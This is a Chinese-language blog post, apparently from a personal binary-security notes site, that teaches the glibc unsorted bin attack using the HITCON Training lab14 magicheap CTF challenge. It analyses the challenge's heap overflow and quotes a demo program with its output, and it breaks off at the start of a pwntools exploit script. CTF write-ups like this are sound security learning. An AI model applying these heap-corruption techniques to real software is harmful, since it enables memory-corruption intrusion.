@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="HITCON Training lab14 magicheap一、题目打印 4 个可见选项，没有暴露第 5 个（后门选项）： 123456789--------------------------------       Magic Heap Creator-------------------------------- 1. Create a Heap 2. Edit a Heap 3. Del">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记：Unsorted Bin Attack">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/05/25/2026-05-25-Unsorted-Bin-Attack/index.html">
+<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
+<meta property="og:description" content="HITCON Training lab14 magicheap一、题目打印 4 个可见选项，没有暴露第 5 个（后门选项）： 123456789--------------------------------       Magic Heap Creator-------------------------------- 1. Create a Heap 2. Edit a Heap 3. Del">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-05-25T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-01T12:25:11.908Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="heap-overflow">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2026/05/25/2026-05-25-Unsorted-Bin-Attack/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/05/25/2026-05-25-Unsorted-Bin-Attack/","path":"2026/05/25/2026-05-25-Unsorted-Bin-Attack/","title":"学习笔记：Unsorted Bin Attack"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>学习笔记：Unsorted Bin Attack | Whoamiuu's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Whoamiuu's Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-Training-lab14-magicheap"><span class="nav-number">1.</span> <span class="nav-text">HITCON Training lab14 magicheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">一、题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Unsorted-Bin-Attack-%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">二、Unsorted Bin Attack 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-number">1.3.</span> <span class="nav-text">三、解决方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">基本思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/05/25/2026-05-25-Unsorted-Bin-Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="学习笔记：Unsorted Bin Attack | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          学习笔记：Unsorted Bin Attack
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-05-25 10:00:00" itemprop="dateCreated datePublished" datetime="2026-05-25T10:00:00+08:00">2026-05-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-06-01 20:25:11" itemprop="dateModified" datetime="2026-06-01T20:25:11+08:00">2026-06-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="HITCON-Training-lab14-magicheap"><a href="#HITCON-Training-lab14-magicheap" class="headerlink" title="HITCON Training lab14 magicheap"></a>HITCON Training lab14 magicheap</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p>打印 4 个可见选项，没有暴露第 5 个（后门选项）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------</span><br><span class="line">       Magic Heap Creator</span><br><span class="line">--------------------------------</span><br><span class="line"> 1. Create a Heap</span><br><span class="line"> 2. Edit a Heap</span><br><span class="line"> 3. Delete a Heap</span><br><span class="line"> 4. Exit</span><br><span class="line">--------------------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure>
+
+<p>创建堆块（create_heap 0x00400931）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">从 heaparray[0] 遍历到 heaparray[9]:</span><br><span class="line">   如果 heaparray[i] == NULL（空闲槽位）:</span><br><span class="line">     1. 提示用户输入 &quot;Size of Heap :&quot;</span><br><span class="line">     2. 读取用户输入的大小值 (atoi)</span><br><span class="line">     3. malloc(大小) 分配内存</span><br><span class="line">     4. 将返回指针存入 heaparray[i]</span><br><span class="line">     5. 如果 malloc 返回 NULL → &quot;Allocate Error&quot; → exit(2)</span><br><span class="line">     6. 提示 &quot;Content of heap:&quot;</span><br><span class="line">     7. 调用 read_input(heaparray[i], 大小) 读取内容</span><br><span class="line">     8. 打印 &quot;SuccessFul&quot;</span><br><span class="line">     9. 返回</span><br></pre></td></tr></table></figure>
+
+<p>如果 10 个槽位全部被占用，循环结束自动返回（无法再分配）。设计约束：最多同时管理 10 个堆块，槽位自动填充到第一个空闲位置。</p>
+<p>编辑堆块（edit_heap 0x00400a47）— 漏洞所在</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 提示 &quot;Index :&quot;</span><br><span class="line">2. 读取索引值 (只读 4 字节)</span><br><span class="line">3. 如果 索引 &lt; 0 或 索引 &gt; 9 → &quot;Out of bound!&quot; → _exit(0)</span><br><span class="line">4. 如果 heaparray[索引] == NULL → &quot;No such heap !&quot; → 返回</span><br><span class="line">5. 否则:</span><br><span class="line">   提示 &quot;Size of Heap :&quot;</span><br><span class="line">   读取新的大小值</span><br><span class="line">   提示 &quot;Content of heap : &quot;</span><br><span class="line">   ★ read_input(heaparray[索引], 新大小)  ← 关键漏洞: 不检查新大小是否超出原始分配大小</span><br><span class="line">6. 打印 &quot;Done !&quot;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞本质：创建时用 malloc(N) 分配了 N 字节，编辑时却允许写入任意大小 M。当 M &gt; N 时，写入数据会溢出到相邻堆块的内存空间（包括堆块头部元数据），导致堆元数据损坏。</p>
+<p>删除堆块（delete_heap 0x00400b53）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 提示 &quot;Index :&quot;</span><br><span class="line">2. 读取索引值 (只读 4 字节)</span><br><span class="line">3. 如果 索引 &lt; 0 或 索引 &gt; 9 → &quot;Out of bound!&quot; → _exit(0)</span><br><span class="line">4. 如果 heaparray[索引] == NULL → &quot;No such heap !&quot; → 返回</span><br><span class="line">5. 否则:</span><br><span class="line">   free(heaparray[索引])     // 释放内存</span><br><span class="line">   heaparray[索引] = NULL    // 清空指针，防止悬垂指针</span><br><span class="line">6. 打印 &quot;Done !&quot;</span><br></pre></td></tr></table></figure>
+
+<p>安全设计：free 后立即将指针置零，杜绝了 use-after-free 和 double-free 的可能。这是一个正确的防御性编程实践，意味着攻击面只能来自于 edit 中的堆溢出。</p>
+<p>数据读取（read_input 0x00400886）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从 stdin 读取 指定大小的数据 到目标缓冲区</span><br><span class="line">  如果 read 返回值 &lt; 1 → 打印 &quot;Error&quot; → _exit(-1)</span><br></pre></td></tr></table></figure>
+
+<p>没有在末尾追加 null 字符，使用原始 read 系统调用。</p>
+<p>后门函数（l33t 0x00400c23）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat ./flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>直接执行 shell 命令打印 flag 文件内容。无参数、无条件，只要能调用到此函数即可获得 flag。</p>
+<h2 id="二、Unsorted-Bin-Attack-原理"><a href="#二、Unsorted-Bin-Attack-原理" class="headerlink" title="二、Unsorted Bin Attack 原理"></a>二、Unsorted Bin Attack 原理</h2><p>在 <a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中可以得知释放进入 unsorted bin 里的 chunk 的复用逻辑，主要代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc.c 中的简化逻辑</span></span><br><span class="line">victim = unsorted_chunks(av)-&gt;bk;  <span class="comment">// 取出最后一个 chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ) || ...)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line"></span><br><span class="line">bck = victim-&gt;bk;                  <span class="comment">// 只使用了 bk 指针！</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;     <span class="comment">// 更新链表头</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);     <span class="comment">// 关键写入操作</span></span><br></pre></td></tr></table></figure>
+
+<p>注意这里仅使用 bk 指针 (在 glibc 2.29 才加入 <code>bk-&gt;fd</code> 的检查)，也就是说，我们只要控制了 bk 指针的值，我们就能将 unsorted_chunks(av) 写到任意地址。</p>
+<p>这里引用 ctf-wiki 里的示例程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序执行后的效果如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack</span><br><span class="line">➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack</span><br><span class="line">This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><br><span class="line">In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let&#x27;s first look at the target we want to rewrite on stack:</span><br><span class="line">0x7ffe0d232518: 0</span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk on the heap at: 0x1fce010</span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508</span><br><span class="line"></span><br><span class="line">Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:</span><br><span class="line">0x7ffe0d232518: 0x7f1c705ffb78</span><br></pre></td></tr></table></figure>
+
+<p>可以看到程序模拟了一个堆溢出或 UAF漏洞，控制 bk 指针，使得 bk &#x3D; target_addr - 16。当我们再次申请一个相同大小的 chunk 时，<code>bck-&gt;fd = unsorted_chunks(av)</code>就会将 main_arena 的值写入到 target_addr。</p>
+<p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制 (main_arena 地址)，唯一可以知道的是，这个值比较大。我们可以有以下思路：</p>
+<ul>
+<li>我们通过修改循环的次数来使得程序可以执行多次循环。</li>
+<li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li>
+</ul>
+<h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>唯一的异常路径是输入隐藏选项4869，它检查 magic 是否 ≥ 4870，满足则调用 l33t() 打印 flag。由于 magic 初始为 0 且无正常代码修改它，攻击者必须利用 edit_heap 中的堆溢出漏洞——实现任意地址写，将 magic 改为目标值，再输入 4869 触发后门。</p>
+<p>我们需要获得任意地址写的能力，思考到 unlink 、fastbin double free、unsorted bin attack</p>
+<ol>
+<li>unlink：此处需要修改的地址在 heaparray 之前，无法构造 fd 和 bk 满足 unlink 中 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 的检查。不可行。</li>
+<li>fastbin double free：double free（free(A) → free(B) → free(A)）要求对同一地址调用两次 free。但 delete_heap 在 free(heaparray[i]) 后立即 heaparray[i] &#x3D; 0，且无 UAF，无法通过正常接口对同一索引 free 两次。另外，目标地址附近无法构造字节错位，也无法再次分配堆块。不可行。</li>
+<li>unsorted bin attack：我们有堆溢出且已知目标地址，可以直接控制 bk，并且程序仅要求目标地址的值大于 4870，完全可以由 main_arena 地址代替。可行。</li>
+</ol>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这部分在下面脚本中实现，并附有详细注释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span 